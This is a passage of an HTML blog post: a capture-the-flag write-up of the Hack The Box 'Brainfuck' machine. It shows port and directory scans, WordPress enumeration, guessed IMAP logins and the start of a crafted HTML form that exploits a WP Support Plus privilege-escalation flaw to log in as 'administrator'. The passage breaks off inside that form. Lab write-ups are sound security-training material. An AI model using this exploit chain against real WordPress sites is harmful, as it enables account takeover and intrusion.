@@ -1,0 +1,709 @@
+<!DOCTYPE html>
+<html lang="en-us"><head><meta charset="utf-8">
+<meta http-equiv="content-type" content="text/html">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title itemprop="name">Writeup - HTB Brainfuck | kei5uke&#39;s Hacking Note</title>
+<meta property="og:title" content="Writeup - HTB Brainfuck | kei5uke&#39;s Hacking Note" />
+<meta name="twitter:title" content="Writeup - HTB Brainfuck | kei5uke&#39;s Hacking Note" />
+<meta itemprop="name" content="Writeup - HTB Brainfuck | kei5uke&#39;s Hacking Note" />
+<meta name="application-name" content="Writeup - HTB Brainfuck | kei5uke&#39;s Hacking Note" />
+<meta property="og:site_name" content="kei5uke&#39;s Hacking Note" />
+
+<meta name="description" content="Writeup for HTB Brainfuck">
+<meta itemprop="description" content="Writeup for HTB Brainfuck" />
+<meta property="og:description" content="Writeup for HTB Brainfuck" />
+<meta name="twitter:description" content="Writeup for HTB Brainfuck" />
+
+<meta property="og:locale" content="en-us" />
+<meta name="language" content="en-us" />
+
+
+
+  <meta itemprop="image" content="" />
+  <meta property="og:image" content="" />
+  <meta name="twitter:image" content="" />
+  <meta name="twitter:image:src" content="" />
+
+
+
+
+    
+    
+    
+    
+
+    <meta property="og:type" content="article" />
+    <meta property="og:article:published_time" content=2023-11-03T00:00:00Z />
+    <meta property="article:published_time" content=2023-11-03T00:00:00Z />
+
+    
+    <meta property="og:article:author" content="Kei5uke" />
+    <meta property="article:author" content="Kei5uke" />
+    <meta name="author" content="Kei5uke" />
+    
+
+    
+
+    <script defer type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "Article",
+        "headline": "Writeup - HTB Brainfuck",
+        "author": {
+        "@type": "Person",
+        "name": ""
+        },
+        "datePublished": "2023-11-03",
+        "description": "Writeup for HTB Brainfuck",
+        "wordCount":  1918 ,
+        "mainEntityOfPage": "True",
+        "dateModified": "2023-11-03",
+        "image": {
+        "@type": "imageObject",
+        "url": ""
+        },
+        "publisher": {
+        "@type": "Organization",
+        "name": "kei5uke\u0027s Hacking Note"
+        }
+    }
+    </script>
+
+
+<meta name="generator" content="Hugo 0.118.2">
+
+    
+
+    <link rel="canonical" href="/posts/brainfuck/">
+    <link href="/style.min.9bd04d0fad85388343088ec85e9afd787ea003e72914d7f57df39c17ab2e7173.css" rel="stylesheet">
+    <link href="/code-highlight.min.706d31975fec544a864cb7f0d847a73ea55ca1df91bf495fd12a177138d807cf.css" rel="stylesheet">
+
+    
+    <link rel="apple-touch-icon" sizes="180x180" href="/icons/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/icons/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/icons/favicon-16x16.png">
+    <link rel="mask-icon" href="/icons/safari-pinned-tab.svg">
+    <link rel="shortcut icon" href="/favicon.ico">
+
+
+
+
+<link rel="manifest" href="/site.webmanifest">
+
+<meta name="msapplication-config" content="/browserconfig.xml">
+<meta name="msapplication-TileColor" content="#2d89ef">
+<meta name="theme-color" content="#434648">
+
+    
+    <link rel="icon" type="image/svg+xml" href="/icons/favicon.svg">
+
+    
+    </head>
+<body data-theme = "auto" class="notransition">
+
+<script src="/js/theme.min.8961c317c5b88b953fe27525839672c9343f1058ab044696ca225656c8ba2ab0.js" integrity="sha256-iWHDF8W4i5U/4nUlg5ZyyTQ/EFirBEaWyiJWVsi6KrA="></script>
+
+<div class="navbar" role="navigation">
+    <nav class="menu" aria-label="Main Navigation">
+        <a href="/" class="logo">
+            <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" 
+viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" 
+stroke-linejoin="round" class="feather feather-home">
+<title>Home</title>
+<path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path>
+<polyline points="9 22 9 12 15 12 15 22"></polyline>
+</svg>
+        </a>
+        <input type="checkbox" id="menu-trigger" class="menu-trigger" />
+        <label for="menu-trigger">
+            <span class="menu-icon">
+                <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" stroke="currentColor" fill="none" viewBox="0 0 14 14"><title>Menu</title><path stroke-linecap="round" stroke-linejoin="round" d="M10.595 7L3.40726 7"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 3.51488L3.49301 3.51488"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 10.4851H3.49301"></path><path stroke-linecap="round" stroke-linejoin="round" d="M0.5 12.5V1.5C0.5 0.947715 0.947715 0.5 1.5 0.5H12.5C13.0523 0.5 13.5 0.947715 13.5 1.5V12.5C13.5 13.0523 13.0523 13.5 12.5 13.5H1.5C0.947715 13.5 0.5 13.0523 0.5 12.5Z"></path></svg>
+            </span>
+        </label>
+
+        <div class="trigger">
+            <ul class="trigger-container">
+                
+                
+                <li>
+                    <a class="menu-link " href="/">
+                        Home
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link active" href="/posts/">
+                        Posts
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link " href="/pages/about/">
+                        About
+                    </a>
+                    
+                </li>
+                
+                <li class="menu-separator">
+                    <span>|</span>
+                </li>
+            </ul>
+            <a id="mode" href="#">
+                <svg xmlns="http://www.w3.org/2000/svg" class="mode-sunny" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
+<title>LIGHT</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
+                <svg xmlns="http://www.w3.org/2000/svg" class="mode-moon" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
+<title>DARK</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
+            </a>
+        </div>
+    </nav>
+</div>
+
+<div class="wrapper post">
+    <main class="page-content" aria-label="Content">
+        <article>
+            <header class="header">
+                <h1 class="header-title">Writeup - HTB Brainfuck</h1>
+                
+                
+                <div class="post-meta">
+                    <time datetime="2023-11-03T00:00:00&#43;00:00" itemprop="datePublished"> 3 Nov 2023 </time>
+                </div>
+                
+            </header>
+                <details class="toc">
+                    <summary><b>Table of Contents</b></summary>
+                    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#brainfuck">Brainfuck</a></li>
+    <li><a href="#enumeration">Enumeration</a>
+      <ul>
+        <li><a href="#nmap">Nmap</a></li>
+        <li><a href="#gobuster">Gobuster</a></li>
+        <li><a href="#imap-143">IMAP 143</a></li>
+      </ul>
+    </li>
+    <li><a href="#dns">DNS</a></li>
+    <li><a href="#wordpress">Wordpress</a>
+      <ul>
+        <li><a href="#wpscan">wpscan</a></li>
+      </ul>
+    </li>
+    <li><a href="#shell">Shell</a></li>
+    <li><a href="#alternative-pwn-root">Alternative pwn root</a></li>
+    <li><a href="#summary">Summary</a></li>
+  </ul>
+</nav>
+                </details>
+                <div class="page-content">
+                <h1 id="brainfuck">Brainfuck</h1>
+<h1 id="enumeration">Enumeration</h1>
+<h2 id="nmap">Nmap</h2>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>root💀kali<span class="o">)</span>-<span class="o">[</span>~/brain<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# nmap -sV -sC -sT -T4 -p- 10.129.228.97 -oN nmap.txt
+</span></span><span class="line"><span class="cl">Starting Nmap 7.94 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2023-11-01 20:02 EET
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.129.228.97
+</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.040s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">Not shown: <span class="m">65530</span> filtered tcp ports <span class="o">(</span>no-response<span class="o">)</span>
+</span></span><span class="line"><span class="cl">PORT    STATE SERVICE  VERSION
+</span></span><span class="line"><span class="cl">22/tcp  open  ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-hostkey: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">2048</span> 94:d0:b3:34:e9:a5:37:c5:ac:b9:80:df:2a:54:a5:f0 <span class="o">(</span>RSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> 6b:d5:dc:15:3a:66:7a:f4:19:91:5d:73:85:b2:4c:b2 <span class="o">(</span>ECDSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  <span class="m">256</span> 23:f5:a3:33:33:9d:76:d5:f2:ea:69:71:e3:4e:8e:02 <span class="o">(</span>ED25519<span class="o">)</span>
+</span></span><span class="line"><span class="cl">25/tcp  open  smtp?
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_smtp-commands: Couldn<span class="err">&#39;</span>t establish connection on port <span class="m">25</span>
+</span></span><span class="line"><span class="cl">110/tcp open  pop3     Dovecot pop3d
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_pop3-capabilities: UIDL USER AUTH-RESP-CODE SASL<span class="o">(</span>PLAIN<span class="o">)</span> TOP CAPA PIPELINING RESP-CODES
+</span></span><span class="line"><span class="cl">143/tcp open  imap     Dovecot imapd
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_imap-capabilities: more have <span class="nv">AUTH</span><span class="o">=</span>PLAINA0001 LITERAL+ LOGIN-REFERRALS SASL-IR post-login ENABLE IMAP4rev1 OK capabilities Pre-login listed IDLE ID
+</span></span><span class="line"><span class="cl">443/tcp open  ssl/http nginx 1.10.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: nginx/1.10.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> tls-alpn: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  http/1.1
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_ssl-date: TLS randomness does not represent <span class="nb">time</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> tls-nextprotoneg: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  http/1.1
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>brainfuck.htb/organizationName<span class="o">=</span>Brainfuck Ltd./stateOrProvinceName<span class="o">=</span>Attica/countryName<span class="o">=</span>GR
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Subject Alternative Name: DNS:www.brainfuck.htb, DNS:sup3rs3cr3t.brainfuck.htb
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid before: 2017-04-13T11:19:29
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_Not valid after:  2027-04-11T11:19:29
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Welcome to nginx!
+</span></span><span class="line"><span class="cl">Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 336.29 seconds
+</span></span></code></pre></div><h2 id="gobuster">Gobuster</h2>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>root💀kali<span class="o">)</span>-<span class="o">[</span>~/brain<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# gobuster dir -u https://10.129.228.97/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories.txt -k
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl">Gobuster v3.5
+</span></span><span class="line"><span class="cl">by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> <span class="p">&amp;</span> Christian Mehlmauer <span class="o">(</span>@firefart<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Url:                     https://10.129.228.97/
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Method:                  GET
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Threads:                 <span class="m">10</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories.txt
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Negative Status codes:   <span class="m">404</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> User Agent:              gobuster/3.5
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Timeout:                 <span class="nv">10s</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl">2023/11/01 20:25:59 Starting gobuster in directory enumeration <span class="nv">mode</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl">Progress: <span class="m">23987</span> / <span class="m">30001</span> <span class="o">(</span>79.95%<span class="o">)[</span>ERROR<span class="o">]</span> 2023/11/01 20:28:14 <span class="o">[</span>!<span class="o">]</span> parse <span class="s2">&#34;https://10.129.228.97/error\x1f_log&#34;</span>: net/url: invalid control character in URL
+</span></span><span class="line"><span class="cl">Progress: <span class="m">30000</span> / <span class="m">30001</span> <span class="o">(</span>100.00%<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl">2023/11/01 20:28:46 <span class="nv">Finished</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span></code></pre></div><h2 id="imap-143">IMAP 143</h2>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>root💀kali<span class="o">)</span>-<span class="o">[</span>~<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# nc 10.129.228.97 <span class="m">143</span>                                                                
+</span></span><span class="line"><span class="cl">* OK <span class="o">[</span>CAPABILITY IMAP4rev1 LITERAL+ SASL-IR LOGIN-REFERRALS ID ENABLE IDLE <span class="nv">AUTH</span><span class="o">=</span>PLAIN<span class="o">]</span> Dovecot ready.
+</span></span><span class="line"><span class="cl">HELO
+</span></span><span class="line"><span class="cl">HELO BAD Error in IMAP <span class="nb">command</span> received by server.
+</span></span><span class="line"><span class="cl">HELLO
+</span></span><span class="line"><span class="cl">HELLO BAD Error in IMAP <span class="nb">command</span> received by server.
+</span></span><span class="line"><span class="cl">A1 LOGIN root root
+</span></span><span class="line"><span class="cl">A1 NO <span class="o">[</span>AUTHENTICATIONFAILED<span class="o">]</span> Authentication failed.
+</span></span><span class="line"><span class="cl">A1 LOGIN brainfuck brainfuck
+</span></span><span class="line"><span class="cl">A1 NO <span class="o">[</span>AUTHENTICATIONFAILED<span class="o">]</span> Authentication failed.
+</span></span></code></pre></div><h1 id="dns">DNS</h1>
+<p>I added <a href="https://www.brainfuck.htb">www.brainfuck.htb</a>, sup3rs3cr3t.brainfuck.htb, brainfuck.htb to /etc/hots and I found wordpress page and some forum on broser.</p>
+<h1 id="wordpress">Wordpress</h1>
+<h2 id="wpscan">wpscan</h2>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>root💀kali<span class="o">)</span>-<span class="o">[</span>~/brain<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# wpscan --url https://brainfuck.htb --disable-tls-checks                                                              <span class="m">4</span> ⨯
+</span></span><span class="line"><span class="cl">_______________________________________________________________
+</span></span><span class="line"><span class="cl">         __          _______   _____
+</span></span><span class="line"><span class="cl">         <span class="se">\ \ </span>       / /  __ <span class="se">\ </span>/ ____<span class="p">|</span>
+</span></span><span class="line"><span class="cl">          <span class="se">\ \ </span> /<span class="se">\ </span> / /<span class="p">|</span> <span class="p">|</span>__<span class="o">)</span> <span class="p">|</span> <span class="o">(</span>___   ___  __ _ _ __ ®
+</span></span><span class="line"><span class="cl">           <span class="se">\ \/</span>  <span class="se">\/</span> / <span class="p">|</span>  ___/ <span class="se">\_</span>__ <span class="se">\ </span>/ __<span class="p">|</span>/ _<span class="sb">`</span> <span class="p">|</span> <span class="s1">&#39;_ \
+</span></span></span><span class="line"><span class="cl"><span class="s1">            \  /\  /  | |     ____) | (__| (_| | | | |
+</span></span></span><span class="line"><span class="cl"><span class="s1">             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+</span></span></span><span class="line"><span class="cl"><span class="s1">
+</span></span></span><span class="line"><span class="cl"><span class="s1">         WordPress Security Scanner by the WPScan Team
+</span></span></span><span class="line"><span class="cl"><span class="s1">                         Version 3.8.18
+</span></span></span><span class="line"><span class="cl"><span class="s1">       Sponsored by Automattic - https://automattic.com/
+</span></span></span><span class="line"><span class="cl"><span class="s1">       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
+</span></span></span><span class="line"><span class="cl"><span class="s1">_______________________________________________________________
+</span></span></span><span class="line"><span class="cl"><span class="s1">
+</span></span></span><span class="line"><span class="cl"><span class="s1">[+] URL: https://brainfuck.htb/ [10.129.228.97]
+</span></span></span><span class="line"><span class="cl"><span class="s1">[+] Started: Thu Nov  2 01:08:41 2023
+</span></span></span><span class="line"><span class="cl"><span class="s1">
+</span></span></span><span class="line"><span class="cl"><span class="s1">Interesting Finding(s):
+</span></span></span><span class="line"><span class="cl"><span class="s1">
+</span></span></span><span class="line"><span class="cl"><span class="s1">[+] Headers
+</span></span></span><span class="line"><span class="cl"><span class="s1"> | Interesting Entry: Server: nginx/1.10.0 (Ubuntu)
+</span></span></span><span class="line"><span class="cl"><span class="s1"> | Found By: Headers (Passive Detection)
+</span></span></span><span class="line"><span class="cl"><span class="s1"> | Confidence: 100%
+</span></span></span><span class="line"><span class="cl"><span class="s1">
+</span></span></span><span class="line"><span class="cl"><span class="s1">[+] XML-RPC seems to be enabled: https://brainfuck.htb/xmlrpc.php
+</span></span></span><span class="line"><span class="cl"><span class="s1"> | Found By: Direct Access (Aggressive Detection)
+</span></span></span><span class="line"><span class="cl"><span class="s1"> | Confidence: 100%
+</span></span></span><span class="line"><span class="cl"><span class="s1"> | References:
+</span></span></span><span class="line"><span class="cl"><span class="s1"> |  - http://codex.wordpress.org/XML-RPC_Pingback_API
+</span></span></span><span class="line"><span class="cl"><span class="s1"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
+</span></span></span><span class="line"><span class="cl"><span class="s1"> |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
+</span></span></span><span class="line"><span class="cl"><span class="s1"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
+</span></span></span><span class="line"><span class="cl"><span class="s1"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/
+</span></span></span><span class="line"><span class="cl"><span class="s1">
+</span></span></span><span class="line"><span class="cl"><span class="s1">[+] WordPress readme found: https://brainfuck.htb/readme.html
+</span></span></span><span class="line"><span class="cl"><span class="s1"> | Found By: Direct Access (Aggressive Detection)
+</span></span></span><span class="line"><span class="cl"><span class="s1"> | Confidence: 100%
+</span></span></span><span class="line"><span class="cl"><span class="s1">
+</span></span></span><span class="line"><span class="cl"><span class="s1">[+] The external WP-Cron seems to be enabled: https://brainfuck.htb/wp-cron.php
+</span></span></span><span class="line"><span class="cl"><span class="s1"> | Found By: Direct Access (Aggressive Detection)
+</span></span></span><span class="line"><span class="cl"><span class="s1"> | Confidence: 60%
+</span></span></span><span class="line"><span class="cl"><span class="s1"> | References:
+</span></span></span><span class="line"><span class="cl"><span class="s1"> |  - https://www.iplocation.net/defend-wordpress-from-ddos
+</span></span></span><span class="line"><span class="cl"><span class="s1"> |  - https://github.com/wpscanteam/wpscan/issues/1299
+</span></span></span><span class="line"><span class="cl"><span class="s1">
+</span></span></span><span class="line"><span class="cl"><span class="s1">[+] WordPress version 4.7.3 identified (Insecure, released on 2017-03-06).
+</span></span></span><span class="line"><span class="cl"><span class="s1"> | Found By: Rss Generator (Passive Detection)
+</span></span></span><span class="line"><span class="cl"><span class="s1"> |  - https://brainfuck.htb/?feed=rss2, &lt;generator&gt;https://wordpress.org/?v=4.7.3&lt;/generator&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1"> |  - https://brainfuck.htb/?feed=comments-rss2, &lt;generator&gt;https://wordpress.org/?v=4.7.3&lt;/generator&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">
+</span></span></span><span class="line"><span class="cl"><span class="s1">[+] WordPress theme in use: proficient
+</span></span></span><span class="line"><span class="cl"><span class="s1"> | Location: https://brainfuck.htb/wp-content/themes/proficient/
+</span></span></span><span class="line"><span class="cl"><span class="s1"> | Last Updated: 2023-11-01T00:00:00.000Z
+</span></span></span><span class="line"><span class="cl"><span class="s1"> | Readme: https://brainfuck.htb/wp-content/themes/proficient/readme.txt
+</span></span></span><span class="line"><span class="cl"><span class="s1"> | [!] The version is out of date, the latest version is 6.8
+</span></span></span><span class="line"><span class="cl"><span class="s1"> | Style URL: https://brainfuck.htb/wp-content/themes/proficient/style.css?ver=4.7.3
+</span></span></span><span class="line"><span class="cl"><span class="s1"> | Style Name: Proficient
+</span></span></span><span class="line"><span class="cl"><span class="s1"> | Description: Proficient is a Multipurpose WordPress theme with lots of powerful features, instantly giving a prof...
+</span></span></span><span class="line"><span class="cl"><span class="s1"> | Author: Specia
+</span></span></span><span class="line"><span class="cl"><span class="s1"> | Author URI: https://speciatheme.com/
+</span></span></span><span class="line"><span class="cl"><span class="s1"> |
+</span></span></span><span class="line"><span class="cl"><span class="s1"> | Found By: Css Style In Homepage (Passive Detection)
+</span></span></span><span class="line"><span class="cl"><span class="s1"> |
+</span></span></span><span class="line"><span class="cl"><span class="s1"> | Version: 1.0.6 (80% confidence)
+</span></span></span><span class="line"><span class="cl"><span class="s1"> | Found By: Style (Passive Detection)
+</span></span></span><span class="line"><span class="cl"><span class="s1"> |  - https://brainfuck.htb/wp-content/themes/proficient/style.css?ver=4.7.3, Match: &#39;</span>Version: 1.0.6<span class="err">&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Enumerating All Plugins <span class="o">(</span>via Passive Methods<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Checking Plugin Versions <span class="o">(</span>via Passive and Aggressive Methods<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>i<span class="o">]</span> Plugin<span class="o">(</span>s<span class="o">)</span> Identified:
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> wp-support-plus-responsive-ticket-system
+</span></span><span class="line"><span class="cl"> <span class="p">|</span> Location: https://brainfuck.htb/wp-content/plugins/wp-support-plus-responsive-ticket-system/
+</span></span><span class="line"><span class="cl"> <span class="p">|</span> Last Updated: 2019-09-03T07:57:00.000Z
+</span></span><span class="line"><span class="cl"> <span class="p">|</span> <span class="o">[</span>!<span class="o">]</span> The version is out of date, the latest version is 9.1.2
+</span></span><span class="line"><span class="cl"> <span class="p">|</span>
+</span></span><span class="line"><span class="cl"> <span class="p">|</span> Found By: Urls In Homepage <span class="o">(</span>Passive Detection<span class="o">)</span>
+</span></span><span class="line"><span class="cl"> <span class="p">|</span>
+</span></span><span class="line"><span class="cl"> <span class="p">|</span> Version: 7.1.3 <span class="o">(</span>100% confidence<span class="o">)</span>
+</span></span><span class="line"><span class="cl"> <span class="p">|</span> Found By: Readme - Stable Tag <span class="o">(</span>Aggressive Detection<span class="o">)</span>
+</span></span><span class="line"><span class="cl"> <span class="p">|</span>  - https://brainfuck.htb/wp-content/plugins/wp-support-plus-responsive-ticket-system/readme.txt
+</span></span><span class="line"><span class="cl"> <span class="p">|</span> Confirmed By: Readme - ChangeLog Section <span class="o">(</span>Aggressive Detection<span class="o">)</span>
+</span></span><span class="line"><span class="cl"> <span class="p">|</span>  - https://brainfuck.htb/wp-content/plugins/wp-support-plus-responsive-ticket-system/readme.txt
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Enumerating Config Backups <span class="o">(</span>via Passive and Aggressive Methods<span class="o">)</span>
+</span></span><span class="line"><span class="cl"> Checking Config Backups - Time: 00:00:02 &lt;<span class="o">==============================================</span>&gt; <span class="o">(</span><span class="m">137</span> / 137<span class="o">)</span> 100.00% Time: 00:00:02
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>i<span class="o">]</span> No Config Backups Found.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>!<span class="o">]</span> No WPScan API Token given, as a result vulnerability data has not been output.
+</span></span><span class="line"><span class="cl"><span class="o">[</span>!<span class="o">]</span> You can get a free API token with <span class="m">25</span> daily requests by registering at https://wpscan.com/register
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Finished: Thu Nov  <span class="m">2</span> 01:08:47 <span class="m">2023</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Requests Done: <span class="m">173</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Cached Requests: <span class="m">5</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Data Sent: 43.166 KB
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Data Received: 203.026 KB
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Memory used: 247.551 MB
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Elapsed time: 00:00:06
+</span></span></code></pre></div><p>I found interesting exploit after searching “wp-support-plus-responsive-ticket-system”</p>
+<p><a href="https://www.exploit-db.com/exploits/41006">WordPress Plugin WP Support Plus Responsive Ticket System 7.1.3 - Privilege Escalation</a></p>
+<p>I made HTML file and made a request through it.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">&lt;form <span class="nv">method</span><span class="o">=</span><span class="s2">&#34;post&#34;</span> <span class="nv">action</span><span class="o">=</span><span class="s2">&#34;https://brainfuck.htb/wp-admin/admin-ajax.php&#34;</span>&gt;
+</span></span><span class="line"><span class="cl">	Username: &lt;input <span class="nv">type</span><span class="o">=</span><span class="s2">&#34;text&#34;</span> <span class="nv">name</span><span class="o">=</span><span class="s2">&#34;username&#34;</span> <span class="nv">value</span><span class="o">=</span><span class="s2">&#34;administrator&#34;</span>&gt;
+</span></span><span class="line"><span class="cl">	&lt;input <span class="nv">type</span><span class="o">=</span><span class="s2">&#34;hidden&#34;</span> <span class="nv">name</span><span class="o">=</span><span class="s2">&#34;email&#34;</span> <span class="nv">value</span><span class="o">=</span><span class="s2">&#34;sth&#34;</span>&gt;
